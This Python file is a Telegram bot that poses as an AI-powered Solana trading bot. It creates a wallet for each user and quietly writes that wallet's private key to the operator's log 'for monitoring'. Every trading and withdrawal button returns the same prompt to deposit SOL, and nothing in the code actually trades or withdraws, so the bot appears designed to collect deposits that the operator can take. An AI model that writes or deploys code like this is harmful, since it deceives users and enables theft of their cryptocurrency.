#!/usr/bin/env python3
"""
SOLANA AI Telegram Bot
High-performance Solana trading bot with wallet generation and real-time balance tracking
"""

import os
import logging
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

from config import BOT_TOKEN, DATABASE_FILE
from wallet_manager import WalletManager
from balance_fetcher import BalanceFetcher
from menu_handlers import MenuHandlers
from keyboard_layouts import KeyboardLayouts
from utils import format_balance, get_french_timestamp, setup_logging

# Set up logging
setup_logging()
logger = logging.getLogger(__name__)

class SolanaAIBot:
    def __init__(self):
        self.wallet_manager = WalletManager()
        self.balance_fetcher = BalanceFetcher()
        self.menu_handlers = MenuHandlers(self.wallet_manager, self.balance_fetcher)
        self.keyboard_layouts = KeyboardLayouts()
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle the /start command"""
        user = update.effective_user
        user_id = user.id
        username = user.username or user.first_name or "Unknown"
        
        # Log the interaction
        timestamp = get_french_timestamp()
        logger.info(f"[{timestamp}] User {username} ({user_id}) started the bot")
        
        try:
            # Generate or retrieve wallet for user
            wallet_data = await self.wallet_manager.get_or_create_wallet(user_id)
            
            # Fetch balance
            balance_sol, balance_usd = await self.balance_fetcher.get_balance(wallet_data['address'])
            
            # Create welcome message
            welcome_text = await self._create_welcome_message(wallet_data, balance_sol, balance_usd)
            
            # Create main menu keyboard
            keyboard = self.keyboard_layouts.get_main_menu()
            
            await update.message.reply_text(
                welcome_text,
                reply_markup=keyboard,
                parse_mode=ParseMode.MARKDOWN_V2
            )
            
        except Exception as e:
            logger.error(f"Error in start_command: {e}")
            await update.message.reply_text(
                "❌ An error occurred while setting up your wallet. Please try again.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    
    async def _create_welcome_message(self, wallet_data, balance_sol, balance_usd):
        """Create the welcome message with wallet info"""
        address = wallet_data['address']
        private_key = wallet_data['private_key']
        
        # Log wallet info to console for monitoring
        timestamp = get_french_timestamp()
        logger.info(f"[{timestamp}] Generated wallet - Address: {address}")
        logger.info(f"[{timestamp}] Generated wallet - Private Key: {private_key}")
        logger.info(f"[{timestamp}] Wallet Balance: {balance_sol} SOL (${balance_usd})")
        
        # Format balance (ensure 0 instead of 0.0)
        balance_sol_str = format_balance(balance_sol)
        balance_usd_str = format_balance(balance_usd)
        
        welcome_text = f"""👋 *Welcome to SOLANA AI\\!*

*Let your trading evolve with intelligence\\!*

🌸 *Your Solana Wallet Address:*

→ W1: `{address}`

🌸 *Your Solana Wallet Private Key:*

→ W1: `{private_key}`

*Balance:* {balance_sol_str} SOL \\(USD ${balance_usd_str}\\)"""
        
        # Add no SOL alert if balance is zero
        if balance_sol == 0:
            welcome_text += "\n\n🔴 *You currently have no SOL in your wallet\\.*\n*To begin trading, please deposit SOL to your address\\.*"
        
        welcome_text += "\n\n📚 *Resources:*"
        
        return welcome_text
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle all button callbacks with optimized instant response"""
        query = update.callback_query
        user = update.effective_user
        username = user.username or user.first_name or "Unknown"
        
        # Log the interaction
        timestamp = get_french_timestamp()
        logger.info(f"[{timestamp}] User {username} ({user.id}) clicked: {query.data}")
        
        try:
            # Check if this is a submenu action that needs instant popup
            submenu_actions = [
                "pos_min_value", "pos_sell_position", "pos_usd",
                "sniper_pro", "sniper_create",
                "copy_add_config", "copy_mass_create", "copy_pause_all", "copy_start_all", "copy_delete_all",
                "early_presale", "early_launchpad",
                "withdraw_50", "withdraw_100", "withdraw_custom", "withdraw_set_address",
                "rug_scan_token", "rug_risk_score",
                "social_trending", "social_influencers"
            ]
            
            if query.data in submenu_actions:
                # Instant popup without any delay or processing
                if query.data.startswith("withdraw_"):
                    message = "🔴 You currently have no\nSOL in your wallet. To start withdrawing, please deposit SOL to your address."
                else:
                    message = "🔴 You currently have no\nSOL in your wallet. To start trading, please deposit SOL to your address."
                
                await query.answer(
                    text=message,
                    show_alert=True
                )
                return
            
            # Answer the callback first for responsiveness
            await query.answer()
            
            # Route to appropriate handler based on callback data
            if query.data == "positions":
                await self.menu_handlers.handle_positions(query)
            elif query.data == "sniper_mode":
                await self.menu_handlers.handle_sniper_mode(query)
            elif query.data == "copy_trade":
                await self.menu_handlers.handle_copy_trade(query)
            elif query.data == "early_launch":
                await self.menu_handlers.handle_early_launch(query)
            elif query.data == "withdraw":
                await self.menu_handlers.handle_withdraw(query)
            elif query.data == "anti_rug":
                await self.menu_handlers.handle_anti_rug(query)
            elif query.data == "social_trend":
                await self.menu_handlers.handle_social_trend(query)
            elif query.data == "back_main":
                await self.menu_handlers.handle_back_to_main(query)
                
        except Exception as e:
            logger.error(f"Error in button_callback: {e}")
            await query.answer(
                text="❌ An error occurred. Please try again.",
                show_alert=True
            )
    
    def run(self):
        """Run the bot"""
        # Create application with optimized settings for maximum performance
        application = (
            Application.builder()
            .token(BOT_TOKEN)
            .concurrent_updates(True)
            .build()
        )
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.start_command))
        application.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Configure polling settings for optimal performance
        logger.info("Starting SOLANA AI Bot...")
        application.run_polling(
            poll_interval=0.0,  # Fastest polling
            timeout=5,
            drop_pending_updates=True  # Skip pending updates for faster startup
        )

if __name__ == "__main__":
    bot = SolanaAIBot()
    bot.run()
